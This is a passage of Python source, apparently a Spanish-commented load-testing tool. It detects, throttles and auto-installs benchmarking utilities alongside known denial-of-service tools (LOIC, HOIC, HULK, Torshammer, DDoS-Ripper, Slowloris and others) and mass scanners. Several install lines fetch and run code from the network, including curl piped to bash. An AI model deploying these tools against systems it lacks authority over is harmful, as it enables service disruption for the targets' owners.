def deploy_tool_gradually(tool_name: str, deploy_func, delay: float = 1.0, max_retries: int = 2):
    # Verificación de autorización e integridad antes de desplegar herramienta
    if not _validate_execution():
        return None
    """
    Despliega una herramienta de forma gradual con verificación de recursos.
    Evita freezes del sistema.
    """
    try:
        # Verificar recursos antes de desplegar
        metrics = PerformanceMonitor.get_system_metrics()
        memory_percent = metrics.get('memory_percent', 0)
        cpu_percent = metrics.get('cpu_percent', 0)
        
        # Si recursos están altos, esperar antes de desplegar
        if memory_percent >= MEMORY_THRESHOLD_WARN:
            wait_time = delay * 2  # Esperar más si memoria está alta
            log_message("WARN", f"Memoria alta ({memory_percent:.1f}%) - esperando {wait_time}s antes de desplegar {tool_name}")
            time.sleep(wait_time)
            # Verificar de nuevo
            metrics = PerformanceMonitor.get_system_metrics()
            memory_percent = metrics.get('memory_percent', 0)
            if memory_percent >= MEMORY_THRESHOLD_CRITICAL:
                log_message("WARN", f"Memoria crítica - omitiendo despliegue de {tool_name}")
                return False
        
        if cpu_percent > 85:
            log_message("WARN", f"CPU alta ({cpu_percent:.1f}%) - esperando {delay}s antes de desplegar {tool_name}")
            time.sleep(delay)
        
        # Desplegar herramienta
        log_message("INFO", f"Desplegando {tool_name}...")
        result = deploy_func()
        
        # Pequeña pausa después del despliegue para que el sistema se estabilice
        time.sleep(delay)
        
        # Verificar que el despliegue fue exitoso
        if result is not None:
            log_message("INFO", f"{tool_name} desplegado correctamente")
            return True
        else:
            log_message("WARN", f"{tool_name} no se pudo desplegar")
            return False
            
    except Exception as e:
        log_message("ERROR", f"Error desplegando {tool_name}: {e}")
        return False

def deploy_tools_with_throttling(tool_list: List[Tuple[str, callable]], max_tools: int, 
                                  initial_delay: float = 0.5, delay_increment: float = 0.2):
    # Verificación de autorización e integridad antes de desplegar herramientas
    if not _validate_execution():
        return 0
    """
    Despliega herramientas con throttling gradual para evitar freezes.
    Aumenta el delay entre despliegues progresivamente.
    """
    deployed_count = 0
    current_delay = initial_delay
    
    for tool_name, deploy_func in tool_list:
        if deployed_count >= max_tools:
            log_message("INFO", f"Límite de herramientas alcanzado ({max_tools})")
            break
        
        # Verificar recursos antes de cada despliegue
        metrics = PerformanceMonitor.get_system_metrics()
        memory_percent = metrics.get('memory_percent', 0)
        
        if memory_percent >= MEMORY_THRESHOLD_CRITICAL:
            log_message("WARN", f"Memoria crítica ({memory_percent:.1f}%) - deteniendo despliegue de herramientas")
            break
        
        # Desplegar con delay progresivo
        success = deploy_tool_gradually(tool_name, deploy_func, delay=current_delay)
        
        if success:
            deployed_count += 1
            # Aumentar delay para el siguiente despliegue (evitar saturación)
            current_delay += delay_increment
        
        # Pausa adicional si memoria está subiendo
        if memory_percent >= MEMORY_THRESHOLD_WARN:
            time.sleep(current_delay * 2)
    
    return deployed_count

# ============================================================================
# INSTALACIÓN DE HERRAMIENTAS
# ============================================================================

def detect_all_tools() -> Dict[str, bool]:
    """Detecta todas las herramientas instaladas"""
    tools_status = {}
    
    # Mapeo de herramientas a sus comandos reales (algunas tienen nombres diferentes)
    tool_command_map = {
        "ab": "ab",  # Apache Bench
        "wrk": "wrk",
        "wrk2": "wrk2",
        "vegeta": "vegeta",
        "bombardier": "bombardier",
        "hey": "hey",
        "siege": "siege",
        "h2load": "h2load",
        "locust": "locust",
        "k6": "k6",
        "artillery": "artillery",
        "tsung": "tsung",
        "jmeter": "jmeter",
        "gatling": "gatling",
        "drill": "drill",
        "http2bench": "http2bench",
        "weighttp": "weighttp",
        "httperf": "httperf",
        "autocannon": "autocannon",
        "hping3": "hping3",
        "nping": "nping",
        "slowhttptest": "slowhttptest",
        "masscan": "masscan",
        "zmap": "zmap",
        "websocat": "websocat",
        "wscat": "wscat",
        "goldeneye": "goldeneye",
        "hulk": "hulk",
        "torshammer": "torshammer",
        "ddos-ripper": "ddos-ripper",
        "pyloris": "pyloris",
        "slowloris": "slowloris",
        "xerxes": "xerxes",
        "hoic": "hoic",
        "loic": "loic",
        "rudy": "rudy",
        "reaper": "reaper"
    }
    
    for category, tools in TOOLS.items():
        for tool in tools:
            # Usar el mapeo si existe, sino usar el nombre del tool directamente
            command = tool_command_map.get(tool, tool)
            tools_status[tool] = check_command_exists(command)
    
    return tools_status

def show_tool_status():
    """Muestra estado de herramientas"""
    tools_status = detect_all_tools()
    
    print_color("\n🛠️ ESTADO DE HERRAMIENTAS", Colors.BOLD, True)
    print()
    
    for category, tools in TOOLS.items():
        print_color(f"{category}:", Colors.CYAN, True)
        for tool in tools:
            is_available = tools_status.get(tool, False)
            status_symbol = "✓" if is_available else "✗"
            status_text = "LISTO" if is_available else "NO DISPONIBLE"
            color = Colors.GREEN if is_available else Colors.RED
            print_color(f"{status_symbol} {tool} {status_text}", color)
    
    installed = sum(1 for v in tools_status.values() if v)
    total = len(tools_status)
    print()
    print_color(f"Total: {installed}/{total} instaladas", Colors.YELLOW if installed < total else Colors.GREEN, True)

def get_install_commands() -> Dict[str, List[str]]:
    """Retorna comandos de instalación para todas las herramientas según el OS"""
    import platform
    system = platform.system()
    
    # Comandos base por sistema operativo
    install_commands = {}
    
    if system == "Windows":
        # Windows - usar chocolatey, winget, pip, npm, scoop
        install_commands = {
            "wrk": [
                "choco install wrk -y",
                "winget install wrk",
                "scoop install wrk"
            ],
            "ab": [
                "choco install apache-httpd -y",
                "winget install Apache.HTTP.Server"
            ],
            "siege": [
                "choco install siege -y",
                "scoop install siege"
            ],
            "hping3": [
                "choco install hping -y",
                "scoop install hping"
            ],
            "nping": [
                "choco install nmap -y",
                "winget install Nmap.Nmap",
                "scoop install nmap"
            ],
            "masscan": [
                "choco install masscan -y",
                "scoop install masscan"
            ],
            "slowhttptest": [
                "choco install slowhttptest -y"
            ],
            "httperf": [
                "choco install httperf -y"
            ],
            "jmeter": [
                "choco install jmeter -y",
                "winget install Apache.JMeter",
                "scoop install jmeter"
            ],
            "vegeta": [
                "choco install vegeta -y",
                "scoop install vegeta"
            ],
            "bombardier": [
                "choco install bombardier -y",
                "scoop install bombardier"
            ],
            "hey": [
                "choco install hey -y",
                "scoop install hey"
            ],
            "autocannon": [
                "npm install -g autocannon"
            ],
            "wscat": [
                "npm install -g wscat"
            ],
            "locust": [
                "pip install locust"
            ],
            "k6": [
                "choco install k6 -y",
                "winget install Grafana.K6",
                "scoop install k6"
            ],
            "artillery": [
                "npm install -g artillery"
            ],
            "goldeneye": [
                "pip install goldeneye"
            ],
            "slowloris": [
                "pip install slowloris"
            ]
        }
    elif system == "Linux":
        # Linux - usar apt, yum, dnf, pacman, pip, npm
        install_commands = {
            "wrk": [
                "apt-get install -y wrk",
                "yum install -y wrk",
                "dnf install -y wrk",
                "pacman -S --noconfirm wrk"
            ],
            "wrk2": [
                "apt-get install -y wrk2",
                "yum install -y wrk2",
                "dnf install -y wrk2"
            ],
            "ab": [
                "apt-get install -y apache2-utils",
                "yum install -y httpd-tools",
                "dnf install -y httpd-tools",
                "pacman -S --noconfirm apache"
            ],
            "siege": [
                "apt-get install -y siege",
                "yum install -y siege",
                "dnf install -y siege",
                "pacman -S --noconfirm siege"
            ],
            "hping3": [
                "apt-get install -y hping3",
                "yum install -y hping3",
                "dnf install -y hping3",
                "pacman -S --noconfirm hping"
            ],
            "nping": [
                "apt-get install -y nmap",
                "yum install -y nmap",
                "dnf install -y nmap",
                "pacman -S --noconfirm nmap"
            ],
            "masscan": [
                "apt-get install -y masscan",
                "yum install -y masscan",
                "dnf install -y masscan",
                "pacman -S --noconfirm masscan"
            ],
            "zmap": [
                "apt-get install -y zmap",
                "yum install -y zmap",
                "dnf install -y zmap",
                "pacman -S --noconfirm zmap"
            ],
            "slowhttptest": [
                "apt-get install -y slowhttptest",
                "yum install -y slowhttptest",
                "dnf install -y slowhttptest",
                "pacman -S --noconfirm slowhttptest"
            ],
            "httperf": [
                "apt-get install -y httperf",
                "yum install -y httperf",
                "dnf install -y httperf",
                "pacman -S --noconfirm httperf"
            ],
            "jmeter": [
                "apt-get install -y jmeter",
                "yum install -y jmeter",
                "dnf install -y jmeter",
                "pacman -S --noconfirm jmeter"
            ],
            "tsung": [
                "apt-get install -y tsung erlang",
                "yum install -y tsung erlang",
                "dnf install -y tsung erlang",
                "pacman -S --noconfirm tsung erlang"
            ],
            "h2load": [
                "apt-get install -y nghttp2-client",
                "yum install -y nghttp2",
                "dnf install -y nghttp2",
                "pacman -S --noconfirm nghttp2"
            ],
            "weighttp": [
                "apt-get install -y weighttp",
                "yum install -y weighttp",
                "dnf install -y weighttp"
            ],
            "vegeta": [
                "apt-get install -y vegeta",
                "yum install -y vegeta",
                "dnf install -y vegeta",
                "snap install vegeta"
            ],
            "bombardier": [
                "snap install bombardier",
                "go install github.com/codesenberg/bombardier@latest",
                "apt-get install -y gpg && curl -fsSL https://bombardier.codeberg.page/gpg | gpg --dearmor -o /usr/share/keyrings/bombardier.gpg && echo 'deb [signed-by=/usr/share/keyrings/bombardier.gpg] https://bombardier.codeberg.page/deb stable main' | tee /etc/apt/sources.list.d/bombardier.list && apt-get update && apt-get install -y bombardier"
            ],
            "hey": [
                "snap install hey",
                "go install github.com/rakyll/hey@latest",
                "wget -O /tmp/hey.deb https://github.com/rakyll/hey/releases/latest/download/hey_linux_amd64.deb && dpkg -i /tmp/hey.deb || apt-get install -f -y"
            ],
            "autocannon": [
                "npm install -g autocannon"
            ],
            "wscat": [
                "npm install -g wscat"
            ],
            "websocat": [
                "apt-get install -y websocat",
                "cargo install websocat",
                "wget -O /usr/local/bin/websocat https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl && chmod +x /usr/local/bin/websocat"
            ],
            "locust": [
                "pip install locust",
                "pip3 install locust",
                "python3 -m pip install locust",
                "apt-get install -y python3-pip && pip3 install locust"
            ],
            "k6": [
                "snap install k6",
                "curl -L https://github.com/grafana/k6/releases/latest/download/k6-v0.47.0-linux-amd64.deb -o /tmp/k6.deb 2>/dev/null && dpkg -i /tmp/k6.deb || apt-get install -f -y",
                "wget -O /tmp/k6.deb https://github.com/grafana/k6/releases/latest/download/k6-v0.47.0-linux-amd64.deb 2>/dev/null && dpkg -i /tmp/k6.deb || apt-get install -f -y",
                "apt-get install -y gpg && gpg --no-default-keyring --keyring /usr/share/keyrings/k6-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D6B 2>/dev/null && echo 'deb [signed-by=/usr/share/keyrings/k6-archive-keyring.gpg] https://dl.k6.io/deb stable main' | tee /etc/apt/sources.list.d/k6.list && apt-get update && apt-get install -y k6",
                "yum install -y k6",
                "dnf install -y k6"
            ],
            "artillery": [
                "npm install -g artillery"
            ],
            "gatling": [
                "apt-get install -y unzip default-jre && wget -O /tmp/gatling.zip https://repo1.maven.org/maven2/io/gatling/highcharts/gatling-charts-highcharts-bundle/3.9.5/gatling-charts-highcharts-bundle-3.9.5-bundle.zip && unzip -q /tmp/gatling.zip -d /opt && ln -sf /opt/gatling-charts-highcharts-bundle-*/bin/gatling.sh /usr/local/bin/gatling && chmod +x /usr/local/bin/gatling",
                "apt-get install -y unzip default-jre && wget -O /tmp/gatling.zip https://repo1.maven.org/maven2/io/gatling/highcharts/gatling-charts-highcharts-bundle/latest/gatling-charts-highcharts-bundle-latest-bundle.zip && unzip -q /tmp/gatling.zip -d /opt && ln -sf /opt/gatling-charts-highcharts-bundle-*/bin/gatling.sh /usr/local/bin/gatling && chmod +x /usr/local/bin/gatling"
            ],
            "drill": [
                "apt-get install -y build-essential libldns-dev autoconf automake libtool && GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/fcambus/drill.git /tmp/drill 2>/dev/null && cd /tmp/drill && ./autogen.sh 2>/dev/null || autoreconf -fiv 2>/dev/null || true && ./configure && make && make install",
                "apt-get install -y build-essential libldns-dev autoconf automake libtool && wget -O /tmp/drill.tar.gz https://github.com/fcambus/drill/archive/refs/heads/master.tar.gz 2>/dev/null && cd /tmp && tar -xzf drill.tar.gz 2>/dev/null && cd drill-master && ./autogen.sh 2>/dev/null || autoreconf -fiv 2>/dev/null || true && ./configure && make && make install",
                "apt-get install -y drill"
            ],
            "http2bench": [
                "go install github.com/fstab/h2c/http2bench@latest",
                "GOPATH=/tmp/go go install github.com/fstab/h2c/http2bench@latest && cp /tmp/go/bin/http2bench /usr/local/bin/http2bench && chmod +x /usr/local/bin/http2bench"
            ],
            "wrk2": [
                "apt-get install -y build-essential libssl-dev git && GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/giltene/wrk2.git /tmp/wrk2 2>/dev/null && cd /tmp/wrk2 && make && cp wrk /usr/local/bin/wrk2 && chmod +x /usr/local/bin/wrk2",
                "apt-get install -y build-essential libssl-dev && wget -O /tmp/wrk2.tar.gz https://github.com/giltene/wrk2/archive/refs/heads/master.tar.gz 2>/dev/null && cd /tmp && tar -xzf wrk2.tar.gz 2>/dev/null && cd wrk2-master && make && cp wrk /usr/local/bin/wrk2 && chmod +x /usr/local/bin/wrk2",
                "apt-get install -y build-essential libssl-dev && curl -L https://github.com/giltene/wrk2/archive/refs/heads/master.tar.gz -o /tmp/wrk2.tar.gz 2>/dev/null && cd /tmp && tar -xzf wrk2.tar.gz 2>/dev/null && cd wrk2-master && make && cp wrk /usr/local/bin/wrk2 && chmod +x /usr/local/bin/wrk2"
            ],
            "weighttp": [
                "apt-get install -y build-essential libev-dev waf python3 && GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/lighttpd/weighttp.git /tmp/weighttp 2>/dev/null && cd /tmp/weighttp && ./waf configure && ./waf build && ./waf install",
                "apt-get install -y build-essential libev-dev waf python3 && wget -O /tmp/weighttp.tar.gz https://github.com/lighttpd/weighttp/archive/refs/heads/master.tar.gz 2>/dev/null && cd /tmp && tar -xzf weighttp.tar.gz 2>/dev/null && cd weighttp-master && ./waf configure && ./waf build && ./waf install",
                "apt-get install -y weighttp"
            ],
            "goldeneye": [
                "pip install goldeneye",
                "pip3 install goldeneye",
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/jseidl/GoldenEye.git /tmp/goldeneye 2>/dev/null && cd /tmp/goldeneye && chmod +x goldeneye.py && cp goldeneye.py /usr/local/bin/goldeneye && chmod +x /usr/local/bin/goldeneye",
                "wget -O /tmp/goldeneye.tar.gz https://github.com/jseidl/GoldenEye/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf goldeneye.tar.gz && cd GoldenEye-master && chmod +x goldeneye.py && cp goldeneye.py /usr/local/bin/goldeneye && chmod +x /usr/local/bin/goldeneye"
            ],
            "hulk": [
                "pip install hulk",
                "pip3 install hulk",
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/grafov/hulk.git /tmp/hulk 2>/dev/null && cd /tmp/hulk && chmod +x hulk.py && cp hulk.py /usr/local/bin/hulk && chmod +x /usr/local/bin/hulk",
                "wget -O /tmp/hulk.tar.gz https://github.com/grafov/hulk/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf hulk.tar.gz && cd hulk-master && chmod +x hulk.py && cp hulk.py /usr/local/bin/hulk && chmod +x /usr/local/bin/hulk"
            ],
            "slowloris": [
                "pip install slowloris",
                "pip3 install slowloris",
                "apt-get install -y slowloris",
                "yum install -y slowloris",
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/gkbrk/slowloris.git /tmp/slowloris 2>/dev/null && cd /tmp/slowloris && chmod +x slowloris.py && cp slowloris.py /usr/local/bin/slowloris && chmod +x /usr/local/bin/slowloris"
            ],
            "torshammer": [
                "pip install torshammer",
                "pip3 install torshammer",
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/dotfighter/torshammer.git /tmp/torshammer 2>/dev/null && cd /tmp/torshammer && chmod +x torshammer.py && cp torshammer.py /usr/local/bin/torshammer && chmod +x /usr/local/bin/torshammer",
                "wget -O /tmp/torshammer.tar.gz https://github.com/dotfighter/torshammer/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf torshammer.tar.gz && cd torshammer-master && chmod +x torshammer.py && cp torshammer.py /usr/local/bin/torshammer && chmod +x /usr/local/bin/torshammer"
            ],
            "ddos-ripper": [
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/palahadi/DDoS-Ripper.git /tmp/ddos-ripper 2>/dev/null && cd /tmp/ddos-ripper && chmod +x DRipper.py && cp DRipper.py /usr/local/bin/ddos-ripper && chmod +x /usr/local/bin/ddos-ripper",
                "wget -O /tmp/ddos-ripper.tar.gz https://github.com/palahadi/DDoS-Ripper/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf ddos-ripper.tar.gz && cd DDoS-Ripper-master && chmod +x DRipper.py && cp DRipper.py /usr/local/bin/ddos-ripper && chmod +x /usr/local/bin/ddos-ripper"
            ],
            "pyloris": [
                "pip install pyloris",
                "pip3 install pyloris",
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/epsylon/pyloris.git /tmp/pyloris 2>/dev/null && cd /tmp/pyloris && chmod +x pyloris.py && cp pyloris.py /usr/local/bin/pyloris && chmod +x /usr/local/bin/pyloris",
                "wget -O /tmp/pyloris.tar.gz https://github.com/epsylon/pyloris/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf pyloris.tar.gz && cd pyloris-master && chmod +x pyloris.py && cp pyloris.py /usr/local/bin/pyloris && chmod +x /usr/local/bin/pyloris"
            ],
            "xerxes": [
                "apt-get install -y build-essential && GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/zanyarjamal/xerxes.git /tmp/xerxes 2>/dev/null && cd /tmp/xerxes && gcc xerxes.c -o xerxes && cp xerxes /usr/local/bin/xerxes && chmod +x /usr/local/bin/xerxes",
                "apt-get install -y build-essential && wget -O /tmp/xerxes.tar.gz https://github.com/zanyarjamal/xerxes/archive/refs/heads/master.tar.gz 2>/dev/null && cd /tmp && tar -xzf xerxes.tar.gz 2>/dev/null && cd xerxes-master && gcc xerxes.c -o xerxes && cp xerxes /usr/local/bin/xerxes && chmod +x /usr/local/bin/xerxes",
                "apt-get install -y build-essential && curl -L https://github.com/zanyarjamal/xerxes/archive/refs/heads/master.tar.gz -o /tmp/xerxes.tar.gz 2>/dev/null && cd /tmp && tar -xzf xerxes.tar.gz 2>/dev/null && cd xerxes-master && gcc xerxes.c -o xerxes && cp xerxes /usr/local/bin/xerxes && chmod +x /usr/local/bin/xerxes"
            ],
            "hoic": [
                "apt-get install -y build-essential && GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/hoic/hoic.git /tmp/hoic 2>/dev/null && cd /tmp/hoic && (test -f hoic && chmod +x hoic && cp hoic /usr/local/bin/hoic) || (test -f hoic.c && gcc -o hoic hoic.c && cp hoic /usr/local/bin/hoic) && chmod +x /usr/local/bin/hoic",
                "apt-get install -y build-essential && wget -O /tmp/hoic.tar.gz https://github.com/hoic/hoic/archive/refs/heads/master.tar.gz 2>/dev/null && cd /tmp && tar -xzf hoic.tar.gz 2>/dev/null && cd hoic-master && (test -f hoic && chmod +x hoic && cp hoic /usr/local/bin/hoic) || (test -f hoic.c && gcc -o hoic hoic.c && cp hoic /usr/local/bin/hoic) && chmod +x /usr/local/bin/hoic"
            ],
            "loic": [
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/NewEraCracker/LOIC.git /tmp/loic 2>/dev/null && cd /tmp/loic && chmod +x loic.py 2>/dev/null && cp loic.py /usr/local/bin/loic && chmod +x /usr/local/bin/loic",
                "wget -O /tmp/loic.tar.gz https://github.com/NewEraCracker/LOIC/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf loic.tar.gz && cd LOIC-master && chmod +x loic.py 2>/dev/null && cp loic.py /usr/local/bin/loic && chmod +x /usr/local/bin/loic"
            ],
            "rudy": [
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/sahilsehgal05/rudy.git /tmp/rudy 2>/dev/null && cd /tmp/rudy && chmod +x rudy.py && cp rudy.py /usr/local/bin/rudy && chmod +x /usr/local/bin/rudy",
                "wget -O /tmp/rudy.tar.gz https://github.com/sahilsehgal05/rudy/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf rudy.tar.gz && cd rudy-master && chmod +x rudy.py && cp rudy.py /usr/local/bin/rudy && chmod +x /usr/local/bin/rudy"
            ],
            "reaper": [
                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/zer0d4y/reaper.git /tmp/reaper 2>/dev/null && cd /tmp/reaper && chmod +x reaper.py && cp reaper.py /usr/local/bin/reaper && chmod +x /usr/local/bin/reaper",
                "wget -O /tmp/reaper.tar.gz https://github.com/zer0d4y/reaper/archive/refs/heads/master.tar.gz && cd /tmp && tar -xzf reaper.tar.gz && cd reaper-master && chmod +x reaper.py && cp reaper.py /usr/local/bin/reaper && chmod +x /usr/local/bin/reaper"
            ]
        }
    else:  # macOS
        # macOS - usar brew, pip, npm
        install_commands = {
            "wrk": [
                "brew install wrk"
            ],
            "ab": [
                "brew install httpd"
            ],
            "siege": [
                "brew install siege"
            ],
            "hping3": [
                "brew install hping"
            ],
            "nping": [
                "brew install nmap"
            ],
            "masscan": [
                "brew install masscan"
            ],
            "zmap": [
                "brew install zmap"
            ],
            "slowhttptest": [
                "brew install slowhttptest"
            ],
            "httperf": [
                "brew install httperf"
            ],
            "jmeter": [
                "brew install jmeter"
            ],
            "tsung": [
                "brew install tsung"
            ],
            "h2load": [
                "brew install nghttp2"
            ],
            "weighttp": [
                "brew install weighttp"
            ],
            "vegeta": [
                "brew install vegeta"
            ],
            "bombardier": [
                "brew install bombardier"
            ],
            "hey": [
                "brew install hey"
            ],
            "autocannon": [
                "npm install -g autocannon"
            ],
            "wscat": [
                "npm install -g wscat"
            ],
            "websocat": [
                "brew install websocat",
                "cargo install websocat"
            ],
            "locust": [
                "pip install locust"
            ],
            "k6": [
                "brew install k6"
            ],
            "artillery": [
                "npm install -g artillery"
            ],
            "gatling": [
                "brew install gatling"
            ],
            "drill": [
                "brew install drill"
            ],
            "goldeneye": [
                "pip install goldeneye"
            ],
            "slowloris": [
                "pip install slowloris",
                "brew install slowloris"
            ]
        }
    
    return install_commands

def check_package_manager(manager: str) -> bool:
    """Verifica si un gestor de paquetes está disponible"""
    import platform
    system = platform.system()
    
    try:
        # Comandos específicos para verificar cada gestor
        check_commands = {
            "choco": ["choco", "--version"],
            "winget": ["winget", "--version"],
            "scoop": ["scoop", "--version"],
            "npm": ["npm", "--version"],
            "pip": ["pip", "--version"],
            "apt-get": ["apt-get", "--version"],
            "yum": ["yum", "--version"],
            "dnf": ["dnf", "--version"],
            "pacman": ["pacman", "--version"],
            "snap": ["snap", "--version"],
            "brew": ["brew", "--version"],
            "cargo": ["cargo", "--version"],
            "go": ["go", "version"]
        }
        
        if manager in check_commands:
            cmd = check_commands[manager]
        else:
            # Fallback: intentar con --version
            cmd = [manager, "--version"]
        
        # En Windows, algunos comandos pueden necesitar shell=True
        use_shell = system == "Windows" and manager in ["choco", "winget", "scoop"]
        
        result = subprocess.run(
            cmd,
            shell=use_shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5
        )
        return result.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        return False

def auto_install_all_tools():
    """Instala todas las herramientas automáticamente"""
    import platform
    system = platform.system()
    
    print_color("\n🔧 Instalando todas las herramientas automáticamente...", Colors.CYAN, True)
    print_color(f"📦 Sistema detectado: {system}", Colors.YELLOW, True)
    
    # Advertencia sobre permisos
    if system != "Windows" and os.geteuid() != 0:
        print_color("⚠ Algunas herramientas pueden requerir permisos de administrador (sudo)", Colors.YELLOW)
        print_color("  Si falla la instalación, intenta ejecutar con: sudo python3 loadtest.py --install-tools", Colors.YELLOW)
    elif system == "Windows":
        print_color("⚠ Algunas herramientas pueden requerir ejecutar como administrador", Colors.YELLOW)
    
    print()
    
    tools_status = detect_all_tools()
    install_commands = get_install_commands()
    
    # Detectar gestores de paquetes disponibles
    package_managers = {}
    if system == "Windows":
        package_managers = {
            "choco": check_package_manager("choco"),
            "winget": check_package_manager("winget"),
            "scoop": check_package_manager("scoop"),
            "npm": check_package_manager("npm"),
            "pip": check_package_manager("pip")
        }
    elif system == "Linux":
        package_managers = {
            "apt-get": check_package_manager("apt-get"),
            "yum": check_package_manager("yum"),
            "dnf": check_package_manager("dnf"),
            "pacman": check_package_manager("pacman"),
            "snap": check_package_manager("snap"),
            "npm": check_package_manager("npm"),
            "pip": check_package_manager("pip"),
            "cargo": check_package_manager("cargo"),
            "go": check_package_manager("go")
        }
    else:  # macOS
        package_managers = {
            "brew": check_package_manager("brew"),
            "npm": check_package_manager("npm"),
            "pip": check_package_manager("pip"),
            "cargo": check_package_manager("cargo")
        }
    
    available_managers = [k for k, v in package_managers.items() if v]
    if available_managers:
        print_color(f"✓ Gestores disponibles: {', '.join(available_managers)}", Colors.GREEN)
    else:
        print_color("⚠ No se detectaron gestores de paquetes", Colors.RED, True)
        print_color("💡 Instala al menos uno: chocolatey (Windows), apt/yum (Linux), o brew (macOS)", Colors.YELLOW)
        return
    
    # Instalar dependencias básicas necesarias para compilación
    if system == "Linux":
        print_color("\n📦 Instalando dependencias básicas...", Colors.CYAN)
        basic_deps_installed = False
        
        # Intentar instalar dependencias básicas
        deps_commands = []
        if "apt-get" in available_managers:
            deps_commands = [
                "apt-get update",
                "apt-get install -y build-essential git gcc g++ make curl wget python3-pip",
                "apt-get install -y libssl-dev libev-dev libldns-dev"
            ]
        elif "yum" in available_managers:
            deps_commands = [
                "yum groupinstall -y 'Development Tools'",
                "yum install -y git gcc gcc-c++ make curl wget python3-pip openssl-devel libev-devel"
            ]
        elif "dnf" in available_managers:
            deps_commands = [
                "dnf groupinstall -y 'Development Tools'",
                "dnf install -y git gcc gcc-c++ make curl wget python3-pip openssl-devel libev-devel"
            ]
        elif "pacman" in available_managers:
            deps_commands = [
                "pacman -S --noconfirm base-devel git curl wget python-pip openssl libev"
            ]
        
        for dep_cmd in deps_commands:
            try:
                result = subprocess.run(
                    dep_cmd,
                    shell=True,
                    check=False,
                    timeout=300,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                if result.returncode == 0:
                    basic_deps_installed = True
            except Exception:
                pass
        
        if basic_deps_installed:
            print_color("  ✓ Dependencias básicas instaladas", Colors.GREEN)
        else:
            print_color("  ⚠ No se pudieron instalar todas las dependencias, continuando...", Colors.YELLOW)
        
        # Verificar e instalar Go si no está disponible
        if "go" not in available_managers:
            print_color("  📥 Instalando Go...", Colors.CYAN)
            go_install_commands = []
            if "apt-get" in available_managers:
                go_install_commands = [
                    "apt-get install -y golang-go",
                    "snap install go --classic"
                ]
            elif "yum" in available_managers:
                go_install_commands = [
                    "yum install -y golang"
                ]
            elif "dnf" in available_managers:
                go_install_commands = [
                    "dnf install -y golang"
                ]
            elif "pacman" in available_managers:
                go_install_commands = [
                    "pacman -S --noconfirm go"
                ]
            
            # También intentar instalación manual de Go
            go_install_commands.append(
                "wget -O /tmp/go.tar.gz https://go.dev/dl/go1.21.5.linux-amd64.tar.gz && rm -rf /usr/local/go && tar -C /usr/local -xzf /tmp/go.tar.gz && echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile && export PATH=$PATH:/usr/local/go/bin"
            )
            
            for go_cmd in go_install_commands:
                try:
                    result = subprocess.run(
                        go_cmd,
                        shell=True,
                        check=False,
                        timeout=300,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    if result.returncode == 0:
                        # Verificar si Go está disponible ahora
                        if check_package_manager("go"):
                            package_managers["go"] = True
                            available_managers.append("go")
                            print_color("    ✓ Go instalado", Colors.GREEN)
                            break
                except Exception:
                    pass
        
        # Verificar e instalar Node.js/npm si no está disponible
        if "npm" not in available_managers:
            print_color("  📥 Instalando Node.js/npm...", Colors.CYAN)
            npm_install_commands = []
            if "apt-get" in available_managers:
                npm_install_commands = [
                    "curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && apt-get install -y nodejs",
                    "apt-get install -y nodejs npm",
                    "snap install node --classic"
                ]
            elif "yum" in available_managers:
                npm_install_commands = [
                    "curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - && yum install -y nodejs"
                ]
            elif "dnf" in available_managers:
                npm_install_commands = [
                    "curl -fsSL https://rpm.nodesource.com/setup_20.x | bash - && dnf install -y nodejs"
                ]
            elif "pacman" in available_managers:
                npm_install_commands = [
                    "pacman -S --noconfirm nodejs npm"
                ]
            
            for npm_cmd in npm_install_commands:
                try:
                    result = subprocess.run(
                        npm_cmd,
                        shell=True,
                        check=False,
                        timeout=300,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    if result.returncode == 0:
                        # Verificar si npm está disponible ahora
                        if check_package_manager("npm"):
                            package_managers["npm"] = True
                            available_managers.append("npm")
                            print_color("    ✓ Node.js/npm instalado", Colors.GREEN)
                            break
                except Exception:
                    pass
    
    print()
    
    installed_count = 0
    failed_count = 0
    skipped_count = 0
    
    # Obtener todas las herramientas únicas de todas las categorías
    all_tools = set()
    for category, tools in TOOLS.items():
        all_tools.update(tools)
    
    for tool in sorted(all_tools):
        if tools_status.get(tool, False):
            print_color(f"✓ {tool} ya está instalado", Colors.GREEN)
            skipped_count += 1
            continue
        
        if tool not in install_commands:
            print_color(f"⚠ {tool} - No hay comandos de instalación disponibles para {system}", Colors.YELLOW)
            failed_count += 1
            continue
        
        print_color(f"📥 Instalando {tool}...", Colors.YELLOW)
        success = False
        
        for command in install_commands[tool]:
            # Verificar si el gestor de paquetes está disponible
            command_parts = command.split()
            manager = command_parts[0] if command_parts else ""
